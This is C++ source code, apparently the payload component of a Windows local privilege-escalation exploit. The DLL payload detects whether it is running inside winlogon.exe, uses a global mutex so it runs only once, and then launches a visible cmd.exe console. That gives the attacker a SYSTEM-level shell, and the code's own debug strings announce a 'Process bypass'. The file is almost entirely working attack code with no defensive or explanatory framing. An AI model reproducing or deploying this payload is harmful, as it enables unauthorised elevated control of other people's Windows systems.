#include "payload_section.hpp"

//WCHAR_DEF(wchrCmdLine, L"C:\\Windows\\system32\\cmd.exe calc.exe")
//WCHAR_DEF(wchrWinStat, L"WinSta0\\Default")

WCHAR_DEF(wchrDebugString1, L"Process bypass done, now executing shell.")
WCHAR_DEF(wchrDebugString3, L"Executing shell\n")
WCHAR_DEF(wchrDebugString4, L"Winlogon detected, spawn....\n")
WCHAR_DEF(szWinLogon, L"winlogon.exe")
CHAR_DEF(cmdLine, "C:\\Windows\\system32\\cmd.exe")
WCHAR_DEF(szMutexName, L"\\BaseNamedObjects\\MutexLayoutPayload")

BOOLEAN
RtlUnicodeStringEndsIn(
    _In_ PCUNICODE_STRING String,
    _In_ PCUNICODE_STRING Substring,
    _In_ BOOLEAN CaseInsensitive
)
{
    if (String->Length < Substring->Length)
        return FALSE;

    const USHORT NumCharsDiff = (String->Length - Substring->Length) / sizeof(WCHAR);
    const UNICODE_STRING Slice = { Substring->Length, static_cast<USHORT>(String->MaximumLength - NumCharsDiff * sizeof(WCHAR)), String->Buffer + NumCharsDiff };
    return RtlEqualUnicodeString(&Slice, Substring, CaseInsensitive);
}

//Spawn shell taking in mind current process that loaded the dll.
void spawnShell() {
    STARTUPINFOA startInfo;
    PROCESS_INFORMATION procInfo;
    ZeroMemory(&startInfo, sizeof(STARTUPINFOA));
    ZeroMemory(&procInfo, sizeof(PROCESS_INFORMATION));

    startInfo.dwFlags = STARTF_USESHOWWINDOW;
    startInfo.wShowWindow = SW_SHOW;
    startInfo.cb = sizeof(startInfo);

    if (CreateProcessA(nullptr,
        (LPSTR)cmdLine, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL, &startInfo,
        &procInfo)
        )
    {
        CloseHandle(procInfo.hProcess);
        CloseHandle(procInfo.hThread);
    }
}

void ExecuteShell(){
    OutputDebugStringW(wchrDebugString3);
    spawnShell();
}

//Will execute if the current module filename IS winlogon, otherwise we dont care.
//Only this module WILL pop the system shell we care about.
//Special thanks for this code to Matti :)
bool checkForWinlogonProcessName(void){
    UNICODE_STRING WinlogonName = RTL_CONSTANT_STRING(szWinLogon);
    if (RtlUnicodeStringEndsIn(&NtCurrentPeb()->ProcessParameters->ImagePathName, &WinlogonName, FALSE))
    {
        OutputDebugStringW(wchrDebugString4);
        return false;
    }
    else{
        return true;
    }
}

//I have noticed that sometimes the payload spawns the shell two times.
//For this case, I decided to create the global mutex so it only executes once :)

//In the payload to execute, you can easily use NtReleaseMutant
bool mutexNotExist(void) {
    HANDLE globalMutex = nullptr;
    UNICODE_STRING MutexName = RTL_CONSTANT_STRING(szMutexName);
    OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(&MutexName, 0);
    NTSTATUS status = NtCreateMutant(&globalMutex, MUTANT_ALL_ACCESS, &ObjectAttributes, TRUE);

    //Mutex already exists or other status, so no need to execute a payload shell.
    if (status == STATUS_OBJECT_NAME_COLLISION || !NT_SUCCESS(status)) {
        return false;
    }
    else
    {
        return true;
    }
}

void mainPayload(){
    if (!checkForWinlogonProcessName() && mutexNotExist()){
        OutputDebugStringW(wchrDebugString1);
        ExecuteShell();
    }
}